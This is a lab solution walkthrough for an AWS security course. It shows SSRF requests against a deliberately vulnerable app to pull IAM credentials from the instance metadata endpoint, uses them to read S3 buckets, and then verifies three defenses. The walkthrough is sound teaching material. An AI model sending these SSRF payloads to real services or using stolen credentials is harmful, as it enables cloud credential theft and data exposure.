# Day 15 Lab — Solution / Verify Walkthrough

## Authorized use only

Same notice as [`README.md`](README.md): only run these commands against resources
`setup.sh` creates in your own AWS sandbox account.

## An honest note on "expected output" below

Unlike the Docker-based labs (Days 0–12), this lab's `setup.sh`/`teardown.sh` were
**authored and syntax-checked (`bash -n`) only** — per this path's constraint for
AWS days, they were never executed against a live account while building this lab.
Every response shape below (IMDS's credential JSON, S3's CLI/HTTP error text) is
AWS's own documented, stable API/CLI response format, not a screenshot from a real
run of this specific lab. Run `setup.sh` yourself in your own sandbox to see the
literal values (IP, role name, account ID) substituted in.

## Step-by-step, with expected output

### 0. Setup

```sh
cd cyber_security/labs/day15
export AWS_PROFILE=cyberlab-sandbox
export ALLOWED_CIDR="$(curl -s https://checkip.amazonaws.com)/32"
./setup.sh
```

Expected final output (values substituted for your account):

```
== Day 15 setup complete ==
Instance public IP : 203.0.113.42
App URL            : http://203.0.113.42:8080/
Instance role       : cyberlab-day15-instance-role
Private bucket      : cyberlab-day15-private-123456789012
Public bucket        : cyberlab-day15-public-123456789012
```

### 1. Recon the app

```sh
curl -s "http://203.0.113.42:8080/"
```

Expected:

```
cyberlab-day15 URL Preview Service. Try: GET /fetch?url=<url>
```

### 2. SSRF to IMDS — enumerate the role name

```sh
curl -s "http://203.0.113.42:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

Expected (a plain-text line, per AWS's documented IMDS response format — this
endpoint returns the role name with no JSON wrapper):

```
cyberlab-day15-instance-role
```

### 3. SSRF to IMDS — steal the temporary credentials

```sh
curl -s "http://203.0.113.42:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cyberlab-day15-instance-role"
```

Expected (AWS's documented IMDS credential-vending JSON shape):

```json
{
  "Code": "Success",
  "LastUpdated": "2026-08-12T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAEXAMPLE...",
  "SecretAccessKey": "wJalrXExampleSecretKey...",
  "Token": "IQoJb3JpZ2luX2VjEXAMPLE...",
  "Expiration": "2026-08-12T06:00:00Z"
}
```

### 4. Use the stolen credentials

```sh
export AWS_ACCESS_KEY_ID=ASIAEXAMPLE...
export AWS_SECRET_ACCESS_KEY=wJalrXExampleSecretKey...
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEXAMPLE...

aws sts get-caller-identity
```

Expected: an ARN naming the *role*, not you —

```json
{
  "UserId": "AROAEXAMPLE:i-0123456789abcdef0",
  "Account": "123456789012",
  "Arn": "arn:aws:sts::123456789012:assumed-role/cyberlab-day15-instance-role/i-0123456789abcdef0"
}
```

```sh
aws s3 ls                                            # attack baseline: EVERY bucket in the account
aws s3 cp "s3://cyberlab-day15-private-123456789012/internal-secret.txt" -
```

Expected: `aws s3 ls` lists every bucket in the account (attack baseline uses the
broad `AmazonS3ReadOnlyAccess` managed policy — Defense 3 narrows this). The private
bucket's object reads back successfully despite Block Public Access being **on** for
that bucket, because these are valid IAM credentials, not an anonymous request:

```
This object is only reachable with a valid AWS credential (Section 2, Step 4).
```

### 5. Read the public bucket with zero credentials

```sh
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
aws s3 cp "s3://cyberlab-day15-public-123456789012/exposed-notes.txt" - --no-sign-request
```

Expected — succeeds with **no credentials of any kind**:

```
This object needs zero credentials to read -- see content/day15-metadata-s3.md, Step 5.
```

### Verify command

```sh
curl -sf "http://203.0.113.42:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  | grep -q "instance-role" && echo ATTACK_OK
```

Expected: `ATTACK_OK`.

## Defense re-verification, before/after

### Defense 1 — IMDSv2

```sh
aws --profile cyberlab-sandbox ec2 modify-instance-metadata-options \
  --instance-id <INSTANCE_ID> --http-tokens required \
  --http-put-response-hop-limit 1 --http-endpoint enabled
```

Re-run Step 3's exact SSRF request. Expected — the app's `/fetch` still runs (it's
still vulnerable code), but IMDS itself now rejects the plain `GET`:

```
401 Unauthorized
```

**Why it stops the attack, precisely:** this app's `/fetch` never sends custom
headers and never issues anything but `GET` (see `url_preview.py`'s docstring in
`setup.sh`). IMDSv2 requires a `PUT` to `/latest/api/token` first, then a `GET`
carrying the returned token in an `X-aws-ec2-metadata-token` header — two things this
specific SSRF gadget cannot do. The credential data hasn't moved; the door in front
of it changed.

### Defense 2 — S3 Block Public Access

```sh
aws --profile cyberlab-sandbox s3api put-public-access-block \
  --bucket cyberlab-day15-public-123456789012 \
  --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
aws --profile cyberlab-sandbox s3api delete-bucket-policy --bucket cyberlab-day15-public-123456789012
```

Re-run Step 5. Expected:

```
An error occurred (AccessDenied) when calling the GetObject operation: Access Denied
```

### Defense 3 — Least-privilege instance role

```sh
aws --profile cyberlab-sandbox iam detach-role-policy \
  --role-name cyberlab-day15-instance-role \
  --policy-arn arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess

aws --profile cyberlab-sandbox iam put-role-policy \
  --role-name cyberlab-day15-instance-role \
  --policy-name day15-scoped-s3-read \
  --policy-document file://scoped-policy.json   # see content/day15-metadata-s3.md Defense 3 for the JSON
```

Re-run Step 4's `aws s3 ls` with a **newly stolen** credential set (a credential set
stolen before this change keeps its old permissions until its own `Expiration` —
policy changes are not retroactive). Expected:

```
aws s3 ls
# now lists nothing, or only the private bucket, depending on account contents

aws s3 cp "s3://cyberlab-day15-private-123456789012/internal-secret.txt" -
# still succeeds -- explicitly scoped in

aws s3 cp "s3://some-other-unrelated-bucket/anything" -
# An error occurred (AccessDenied) when calling the GetObject operation: Access Denied
```

## Teardown verification

```sh
cd cyber_security/labs/day15
export AWS_PROFILE=cyberlab-sandbox
./teardown.sh
```

Expected confirmation commands (printed by `teardown.sh`, and safe to re-run
yourself):

```sh
aws --profile cyberlab-sandbox --region us-east-1 ec2 describe-instances \
  --filters Name=tag:purpose,Values=cyberlab-day15 \
  --query 'Reservations[].Instances[].State.Name'
# expect: [] or ["terminated"]

aws --profile cyberlab-sandbox s3 ls | grep cyberlab-day15
# expect: no output

aws --profile cyberlab-sandbox iam get-role --role-name cyberlab-day15-instance-role
# expect: An error occurred (NoSuchEntity) when calling the GetRole operation
```
